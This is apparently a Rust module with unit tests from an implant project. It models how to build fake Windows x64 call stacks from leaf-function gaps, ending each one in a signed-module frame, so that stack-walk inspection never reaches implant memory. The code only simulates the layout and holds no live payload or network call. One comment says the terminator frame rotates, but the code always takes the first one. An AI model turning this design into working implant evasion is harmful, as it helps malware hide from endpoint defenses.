//! BYOUD-Gap / LACUNA-Chain call-stack-spoof frame synthesizer (pure model).
//!
//! A Windows x64 stack unwinder (`RtlVirtualUnwind` / `RtlLookupFunctionEntry`)
//! walks the return-address chain at `[RSP]`, `[RSP+8]`, `[RSP+16]` … For each
//! candidate address it asks `RtlLookupFunctionEntry`:
//!
//! * **Backed** — resolves to a function with `.pdata` / `UNWIND_INFO`. The
//!   unwinder pops the frame per the unwind codes (variable-size stack adjust)
//!   and continues to the next return address.
//! * **Leaf gap** — `RtlLookupFunctionEntry` returns NULL (no `.pdata` entry).
//!   The unwinder treats it as a *leaf function*: advance RSP by exactly 8
//!   bytes and continue. **No shadow-stack consultation occurs for leaf
//!   frames** — this is what makes gap-based spoof CET-safe.
//!
//! BYOUD-Gap weaponizes leaf gaps as bridge frames: a robust synthetic chain
//! terminates with a run of leaf gaps so the unwind "falls off" cleanly — RSP
//! advancing 8 bytes per gap — before it ever reaches implant-allocated memory.
//! This module models the chain **purely** (no real execution) so the layout is
//! unit-testable on the host.
//!
//! **Simplification:** real `UNWIND_INFO` encodes per-frame stack sizes; here a
//! `Backed` frame is modelled as advancing 8 bytes (the return-address slot)
//! and then **terminating** the synthetic walk (its return escapes the chain we
//! author). `LeafGap` frames advance 8 bytes and continue.

#![cfg_attr(not(test), allow(dead_code))]

extern crate alloc;

use alloc::vec::Vec;

/// How the x64 unwinder treats a synthesized frame address.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FrameKind {
    /// `RtlLookupFunctionEntry` returns NULL → leaf: RSP += 8, continue.
    LeafGap,
    /// Resolves to `.pdata` → unwinds via `UNWIND_INFO`; modelled as terminal.
    Backed,
}

/// One synthesized return-address slot in the fake call chain.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct SyntheticFrame {
    /// The address the unwinder inspects.
    pub addr: usize,
    /// Expected unwinder treatment of `addr`.
    pub kind: FrameKind,
}

/// Incremental builder for an ordered synthetic frame chain.
///
/// Push in call order; `build()` yields the chain with `frames[0]` == `[RSP]`
/// (the innermost / most-recent return address).
pub struct FrameChainBuilder {
    frames: Vec<SyntheticFrame>,
}

impl FrameChainBuilder {
    pub fn new() -> Self {
        Self { frames: Vec::new() }
    }

    /// Push a backed (`.pdata`-resolvable) module address.
    pub fn push_backed(&mut self, addr: usize) {
        self.frames.push(SyntheticFrame { addr, kind: FrameKind::Backed });
    }

    /// Push a leaf-gap address (no `.pdata`).
    pub fn push_leaf_gap(&mut self, addr: usize) {
        self.frames.push(SyntheticFrame { addr, kind: FrameKind::LeafGap });
    }

    /// Consume the builder; `frames[0]` == `[RSP]`.
    pub fn build(self) -> Vec<SyntheticFrame> {
        self.frames
    }
}

impl Default for FrameChainBuilder {
    fn default() -> Self {
        Self::new()
    }
}

/// Simulate the bytes an x64 unwinder advances while walking `chain`.
///
/// `LeafGap` → RSP += 8 and continue; `Backed` → RSP += 8 (return-address slot)
/// then **stop** (a backed frame's return leaves the chain we control). Empty
/// chain → 0.
pub fn unwind_depth(chain: &[SyntheticFrame]) -> usize {
    let mut total: usize = 0;
    for frame in chain {
        total += 8;
        if frame.kind == FrameKind::Backed {
            break;
        }
    }
    total
}

/// Build a pure leaf-gap bridge chain of `depth` frames, drawing addresses
/// round-robin from `gaps` → `nops` → `ghosts` (one from each pool per round,
/// by index, skipping pools shorter than the current index). Returns an empty
/// vec if `depth == 0` or no pool has any usable address.
pub fn build_leaf_bridge(
    gaps: &[usize],
    nops: &[usize],
    ghosts: &[usize],
    depth: usize,
) -> Vec<SyntheticFrame> {
    let pools: [&[usize]; 3] = [gaps, nops, ghosts];
    if depth == 0 || pools.iter().all(|p| p.is_empty()) {
        return Vec::new();
    }
    let mut out: Vec<SyntheticFrame> = Vec::with_capacity(depth);
    let max_len = pools.iter().map(|p| p.len()).max().unwrap_or(0);
    'outer: for i in 0..max_len {
        for pool in pools {
            if i < pool.len() {
                out.push(SyntheticFrame { addr: pool[i], kind: FrameKind::LeafGap });
                if out.len() == depth {
                    break 'outer;
                }
            }
        }
    }
    out
}

/// Build a LACUNA six-layer chain: a deep leaf-lacuna bridge round-robining
/// across **five** pools (gaps → nops → ghosts → tails → backed), terminating
/// with a backed module-legitimate frame so the unwinder's final walk resolves
/// to a real signed module (defeats return-address-in-module validation).
///
/// This is the LACUNA evolution of [`build_leaf_bridge`]:
/// - Layer 4 (tails): tail-padding lacunae — large contiguous unwinder-invisible regions.
/// - Layer 5 (backed): real `.pdata`-covered functions as the chain terminator.
///
/// The `backed` pool supplies `FrameKind::Backed` frames (terminal in the
/// unwinder walk); all other pools supply `LeafGap` frames. If `backed` is
/// empty, the chain is all-leaf (degrades to the BYOUD-Gap behavior).
///
/// Returns an empty vec if `depth == 0` or all leaf pools are empty.
pub fn build_lacuna_chain(
    gaps: &[usize],
    nops: &[usize],
    ghosts: &[usize],
    tails: &[usize],
    backed: &[usize],
    depth: usize,
) -> Vec<SyntheticFrame> {
    // Leaf pools (round-robin for the bridge body).
    let leaf_pools: [&[usize]; 4] = [gaps, nops, ghosts, tails];
    if depth == 0 || leaf_pools.iter().all(|p| p.is_empty()) {
        return Vec::new();
    }
    let mut out: Vec<SyntheticFrame> = Vec::with_capacity(depth);
    // Reserve the last slot for a backed terminator if available.
    let leaf_depth = if !backed.is_empty() { depth.saturating_sub(1) } else { depth };
    let max_len = leaf_pools.iter().map(|p| p.len()).max().unwrap_or(0);
    'outer: for i in 0..max_len {
        for pool in leaf_pools {
            if i < pool.len() {
                out.push(SyntheticFrame { addr: pool[i], kind: FrameKind::LeafGap });
                if out.len() == leaf_depth {
                    break 'outer;
                }
            }
        }
    }
    // Append the backed terminator (layer 5) — round-robin the first entry so
    // consecutive chains don't share the same terminator address.
    if !backed.is_empty() && out.len() < depth {
        out.push(SyntheticFrame { addr: backed[0], kind: FrameKind::Backed });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builder_ordering_rsp_is_first_pushed() {
        let mut b = FrameChainBuilder::new();
        b.push_backed(0x1400_0000);
        b.push_leaf_gap(0x1800_1000);
        b.push_leaf_gap(0x1800_2000);
        let chain = b.build();
        assert_eq!(chain.len(), 3);
        assert_eq!(chain[0], SyntheticFrame { addr: 0x1400_0000, kind: FrameKind::Backed });
        assert_eq!(chain[1], SyntheticFrame { addr: 0x1800_1000, kind: FrameKind::LeafGap });
        assert_eq!(chain[2], SyntheticFrame { addr: 0x1800_2000, kind: FrameKind::LeafGap });
    }

    #[test]
    fn leaf_bridge_round_robin_interleaves_pools() {
        let gaps = [0xA0, 0xA1, 0xA2];
        let nops = [0xB0, 0xB1];
        let ghosts = [0xC0];
        // i=0: A0,B0,C0  i=1: A1,B1  i=2: A2  → 6 frames, depth 6
        let chain = build_leaf_bridge(&gaps, &nops, &ghosts, 6);
        assert_eq!(chain.len(), 6);
        assert!(chain.iter().all(|f| f.kind == FrameKind::LeafGap));
        let addrs: Vec<usize> = chain.iter().map(|f| f.addr).collect();
        assert_eq!(addrs, vec![0xA0, 0xB0, 0xC0, 0xA1, 0xB1, 0xA2]);
    }

    #[test]
    fn leaf_bridge_stops_at_depth() {
        let gaps = [0xA0, 0xA1, 0xA2, 0xA3, 0xA4];
        let chain = build_leaf_bridge(&gaps, &[], &[], 3);
        assert_eq!(chain.len(), 3);
        assert_eq!(chain[2].addr, 0xA2);
    }

    #[test]
    fn leaf_bridge_empty_inputs_yield_empty_output() {
        assert!(build_leaf_bridge(&[], &[], &[], 8).is_empty());
        assert!(build_leaf_bridge(&[1, 2], &[3], &[], 0).is_empty());
    }

    #[test]
    fn leaf_bridge_falls_back_across_pools_when_one_is_short() {
        // gaps has 1, nops has 3 → depth 4 drains nops after gaps
        let chain = build_leaf_bridge(&[0xA0], &[0xB0, 0xB1, 0xB2], &[], 4);
        assert_eq!(chain.len(), 4);
        // i=0: A0,B0  i=1: B1  i=2: B2
        let addrs: Vec<usize> = chain.iter().map(|f| f.addr).collect();
        assert_eq!(addrs, vec![0xA0, 0xB0, 0xB1, 0xB2]);
    }

    #[test]
    fn unwind_depth_monotonic_in_leaf_count() {
        let d1 = unwind_depth(&[SyntheticFrame { addr: 1, kind: FrameKind::LeafGap }]);
        let d2 = unwind_depth(&[
            SyntheticFrame { addr: 1, kind: FrameKind::LeafGap },
            SyntheticFrame { addr: 2, kind: FrameKind::LeafGap },
        ]);
        assert!(d1 < d2);
        assert_eq!(d1, 8);
        assert_eq!(d2, 16);
    }

    #[test]
    fn mixed_chain_terminates_at_first_backed_frame() {
        let chain = [
            SyntheticFrame { addr: 1, kind: FrameKind::LeafGap },
            SyntheticFrame { addr: 2, kind: FrameKind::LeafGap },
            SyntheticFrame { addr: 3, kind: FrameKind::Backed },
            SyntheticFrame { addr: 4, kind: FrameKind::LeafGap },
        ];
        // 2 leaf (16) + 1 backed (8) = 24; trailing leaf ignored.
        assert_eq!(unwind_depth(&chain), 24);
    }

    #[test]
    fn empty_chain_has_zero_depth() {
        assert_eq!(unwind_depth(&[]), 0);
    }

    // ---- LACUNA chain tests (five-pool + backed terminator) ----

    #[test]
    fn lacuna_chain_round_robins_five_pools() {
        let gaps = [0xA0];
        let nops = [0xB0];
        let ghosts = [0xC0];
        let tails = [0xD0];
        let backed = [0xE0]; // terminator
        // depth 5 → 4 leaf frames (one per leaf pool) + 1 backed terminator
        let chain = build_lacuna_chain(&gaps, &nops, &ghosts, &tails, &backed, 5);
        assert_eq!(chain.len(), 5);
        // First 4 are leaf gaps, round-robin across gaps/nops/ghosts/tails.
        assert_eq!(chain[0].addr, 0xA0);
        assert_eq!(chain[0].kind, FrameKind::LeafGap);
        assert_eq!(chain[1].addr, 0xB0);
        assert_eq!(chain[2].addr, 0xC0);
        assert_eq!(chain[3].addr, 0xD0);
        // Last is the backed terminator.
        assert_eq!(chain[4].addr, 0xE0);
        assert_eq!(chain[4].kind, FrameKind::Backed);
    }

    #[test]
    fn lacuna_chain_terminates_with_backed_when_available() {
        // Even with many leaf addresses, the LAST frame is always backed.
        let gaps = [0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7];
        let backed = [0xE0];
        let chain = build_lacuna_chain(&gaps, &[], &[], &[], &backed, 8);
        assert_eq!(chain.len(), 8);
        assert_eq!(chain.last().unwrap().kind, FrameKind::Backed);
        assert_eq!(chain.last().unwrap().addr, 0xE0);
    }

    #[test]
    fn lacuna_chain_without_backed_is_all_leaf() {
        // No backed pool → degrades to pure leaf bridge (BYOUD-Gap behavior).
        let gaps = [0xA0, 0xA1];
        let tails = [0xD0, 0xD1];
        let chain = build_lacuna_chain(&gaps, &[], &[], &tails, &[], 4);
        assert_eq!(chain.len(), 4);
        assert!(chain.iter().all(|f| f.kind == FrameKind::LeafGap));
    }

    #[test]
    fn lacuna_chain_empty_when_all_pools_empty() {
        assert!(build_lacuna_chain(&[], &[], &[], &[], &[0xE0], 4).is_empty());
        assert!(build_lacuna_chain(&[0xA0], &[], &[], &[], &[], 0).is_empty());
    }

    #[test]
    fn lacuna_chain_uses_tails_pool() {
        // tails-only host (no inter-function gaps) still produces a chain.
        let tails = [0xD0, 0xD1, 0xD2];
        let chain = build_lacuna_chain(&[], &[], &[], &tails, &[], 3);
        assert_eq!(chain.len(), 3);
        assert!(chain.iter().all(|f| f.addr >= 0xD0));
    }
}
